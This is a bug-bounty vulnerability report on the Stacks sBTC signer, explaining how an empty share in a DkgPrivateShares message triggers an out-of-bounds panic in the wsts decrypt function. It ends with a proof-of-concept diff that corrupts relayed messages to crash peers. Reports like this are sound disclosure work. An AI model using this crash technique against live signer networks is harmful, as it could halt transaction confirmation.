# #37814 \[BC-High] Signers can crash other signers by sending an invalid \`DkgPrivateShares\` due to mis

**Submitted on Dec 16th 2024 at 16:26:55 UTC by @n4nika for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #37814
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Summary

Signers do not verify received `DkgPrivateShares` payloads enough, allowing any signer to send such a payload with a `share` containing an empty `bytes` object, which will cause the signer to crash due to an OOB read in the `wsts` library.

## Finding Description

When a signer receives a `DkgPrivateShares` message, they process the received message without doing much verification of the message:

`transaction_signer.rs::handle_wsts_message`

```rs
WstsNetMessage::DkgPrivateShares(dkg_private_shares) => {
    tracing::info!(
        signer_id = %dkg_private_shares.signer_id,
        "handling DkgPrivateShares"
    );
    let public_keys = match self.wsts_state_machines.get(&msg.txid) {
        Some(state_machine) => &state_machine.public_keys,
        None => return Err(Error::MissingStateMachine),
    };
    let signer_public_key = match public_keys.signers.get(&dkg_private_shares.signer_id)
    {
        Some(key) => PublicKey::from(key),
        None => return Err(Error::MissingPublicKey),
    };

    if signer_public_key != msg_public_key {
        return Err(Error::InvalidSignature);
    }
    self.relay_message(msg.txid, &msg.inner, bitcoin_chain_tip)
        .await?;
}
```

In `relay_message`, the `msg.inner` gets passed to `process`:

```rs
async fn relay_message(
    &mut self,
    txid: bitcoin::Txid,
    msg: &WstsNetMessage,
    bitcoin_chain_tip: &model::BitcoinBlockHash,
) -> Result<(), Error> {
    let Some(state_machine) = self.wsts_state_machines.get_mut(&txid) else {
        tracing::warn!("missing signing round");
        return Ok(());
    };

    let outbound_messages = state_machine.process(msg).map_err(Error::Wsts)?;
    // [...]
}
```

After a few steps, this then calls `wsts::dkg_private_shares` which calls `wsts::decrypt`:

```rs
pub fn decrypt(key: &[u8; 32], data: &[u8]) -> Result<Vec<u8>, AesGcmError> {
    let nonce_vec = data[..AES_GCM_NONCE_SIZE].to_vec();
    let cipher_vec = data[AES_GCM_NONCE_SIZE..].to_vec();
    let nonce = Nonce::from_slice(&nonce_vec);
    let cipher = Aes256Gcm::new(key.into());

    cipher.decrypt(nonce, cipher_vec.as_ref())
}
```

Here `key` and `data` are passed and taken from the `DkgPrivateShares` message without validation. Since there is no validation, the slicings will cause the program to crash since it accesses OOB memory.

## Impact

Since `DkgPrivateShares` messages are accepted by any signer and not only the coordinator, this allows ANY signer in the signer set to crash all other signers, causing a complete network shutdown.

## Mitigation

Consider verifying the validity of received wsts payloads either in the signer itself or the `wsts` library.

## Proof of Concept

## PoC

In this PoC I simulate sending such a malformed payload.

Please apply the following diff and execute the test with `cargo test --package signer --test integration -- transaction_coordinator::sign_bitcoin_transaction --exact --show-output --ignored --nocapture`. This will crash at `<PATH>/.cargo/git/checkouts/wsts-deb3c7c6853b6eab/ebd7d77/src/util.rs:66:25`.

```diff
diff --git a/signer/src/transaction_signer.rs b/signer/src/transaction_signer.rs
index e5aa9575..662a19c1 100644
--- a/signer/src/transaction_signer.rs
+++ b/signer/src/transaction_signer.rs
@@ -613,7 +613,25 @@ where
                 if signer_public_key != msg_public_key {
                     return Err(Error::InvalidSignature);
                 }
-                self.relay_message(msg.txid, &msg.inner, bitcoin_chain_tip)
+
+                let mut msg_copy = msg.clone();
+
+                let out = match msg_copy.inner {
+                    wsts::net::Message::DkgPrivateShares(mut msg) => {
+                        for (id, second) in msg.shares.clone() {
+                            for (key, bytes) in second {
+                                let mut reference = msg.shares[0].1.get_mut(&key).unwrap();
+                                let mut vec: Vec<u8> = Vec::new();
+                                *reference = vec;
+                                break;
+                            }
+                        }
+                        wsts::net::Message::DkgPrivateShares(msg)
+                    },
+                    _ => {msg_copy.inner}
+                };
+
+                self.relay_message(msg.txid, &out, bitcoin_chain_tip)
                     .await?;
             }
             WstsNetMessage::DkgEndBegin(_) => {

```
